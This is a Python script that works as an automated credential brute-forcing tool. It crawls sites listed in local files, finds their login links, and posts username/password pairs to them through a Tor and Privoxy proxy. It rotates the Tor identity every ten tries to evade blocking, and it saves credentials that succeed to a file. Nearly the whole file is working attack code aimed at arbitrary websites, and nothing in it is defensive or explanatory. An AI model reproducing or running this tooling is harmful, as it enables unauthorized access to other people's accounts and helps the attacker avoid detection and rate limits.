#!/bin/python3

"""
Created on Sun Feb 23 00:12:12 2020

@author: Manish
"""

from LinkCollection import formate
from Domain import domname
from urllib.request import urlopen
from bs4 import BeautifulSoup
from threading import Thread
from time import sleep
from Main import logging
import requests
import urllib
import os
import time
import json
import threading


try:
	from stem import Signal                              #install these files using pip3 command in python3 
	from stem.control import Controller
except ImportError:
	logging('You need to have Stem to run this program\n')

parentdir = os.getcwd()
lock = threading.Lock()
return_list = []

def ipchange():
	time.sleep(60)                                        # a nap before changing the ip of machine
	with Controller.from_port(port=9055) as controller:
		controller.authenticate(password='**********')    #use your tor setup  password which you have hashed 
		controller.signal(Signal.NEWNYM)
	return 0

def savecred(login,Dict):
	with lock:                                                #acquired lock to use a file one at a time by the thread.
		with open(parentdir+'/credentials.txt','a') as cd:
			cd.write(login+':'+str(Dict))
	return 0

def bruteforcer(login,Dict):                    #it is a threaded function 
	global return_list
	header = formate(False)                    #getting the header to make request for individaul thread
    #using tor and privoxy you can see how to setup the privoxy and tor and than run this program without 
    #those this function will not work properly 
	try:
		response = requests.post(url=login,proxies={'https':'127.0.0.1:8118'},data=json.dumps(Dict),headers=header)
	except requests.exceptions.TooManyRedirects:
		bruteforcer(login,Dict)
	except requests.exceptions.InvalidURL as e:
		logging(str(e))
	if response.status_code == 200:
		savecred(login,Dict)
		return_list.append(True)

	elif int(response.status_code/100) == 5:
		return 0
	else:
		return_list.append(False)
	return 0

def loginset(loginlink):
	global return_list
	i = -1
	Dict = {}
	threads = len(os.sched_getaffinity(0))     #checking how many threads your machine can handle
	if threads == 8:
		threads = 3                           #than according to need assigning the values
	else:
		threads = 2
	try:
		user_name = open(parentdir+'/user_name.txt','r')
		password = open(parentdir+'/passwords.txt','r')
	except FileNotFoundError:
		logging("T3Please add username and password file and some data in it\n")

	for name,pcode in zip(user_name,password):   #making the dictionary of every username and password
		i += 1
		Dict.update({i:{str(name).strip('\n\r'):str(pcode).strip('\n\r')}})

	i = -1
	length = len(Dict)
	while(length > i):
		for j in range(threads):              #to starting in range threads
			i += 1
			try:
				t1 = Thread(target=bruteforcer,args=(loginlink,Dict[i]))
				t1.start()
			except KeyError:
				return 0
		t1.join()
		if not i%10:
			ipchange()                       # calling to change the ipchenge() function after 10 tries
		elif True in return_list:
			return_list = []      
			return 0
		else:
			continue

	user_name.close()
	password.close()
	return 0

def page_process(html_text):                             # to get the links which has the sign in or login value..and collecting them to process furthur
	soup = BeautifulSoup(html_text,'html.parser')
	for link in soup.find_all('a'):
		text = link.get_text().lower()
		if ('login' in text) or ('sigin' in text) or ('log in' in text) or ('sign in' in text):
			loginlink = link.get('href')
			loginset(loginlink)
			return 0
		else:
			continue

def pagecontent(link):
	format = formate(link)
	try:
		with urlopen(format) as u:
			html_text = u.read().decode('utf-8',errors='ignore')
			page_process(html_text)
	except urllib.request.URLError as e:
		logging("Bad URL::%s\n"%str(e))
	return 0

def readwriteload():                            #tricky write read opening file to prcocess furthur
	d_name_list = []
	d_file_write = True
	d_file = parentdir + '/d_names.txt'
	try:
		d_file_read = open(d_file,'r')
	except FileNotFoundError:
		d_file_write = open(d_file,'a')
	if d_file_write == True:
		d_file_write = open(d_file,'a')
	else:
		d_file_read = open(d_file,'r')
	for name in d_file_read.readlines():
		d_name_list.append(name.strip('\r\n'))

	d_file_read.close()
	return d_name_list,d_file_write

def data_processing(lines,file):
	d_name_list,d_file_write = readwriteload()
	for link in lines:
		link = link.strip('\r\n')
		d_name = domname(link)
		if d_name in d_name_list:
			continue			                                       #if already done for this site skip
		else:
			pagecontent(link)
			d_file_write.write(d_name.lower()+'\n')
			d_name_list,d_file_write = readwriteload()
		d_file_write.close()
	return 0

def link_processing(file_names):
	if file_names == []:
		logging('T3No files to process please check your link collection file\n')

	else:
		for file in file_names:
			os.chdir(parentdir+'/data')
			with open(file,'r') as f:
				lines = f.readlines()
			data_processing(lines,file)
	return 0

def file():
	file_names = []
	if not os.path.isdir(parentdir+'/data'):
		logging("T3No Directory to process please check your link collection file\n")

	else:
		try:
			os.chdir(parentdir+'/data')
			for a,b,c in os.walk(os.getcwd()):
				for filename in c:
					file_names.append(filename)
		except OSError:
			logging('T3Try as root user %s\n'%str(OSError))

	return link_processing(file_names)

def main():
	sleep(90)
	file()
	return 0
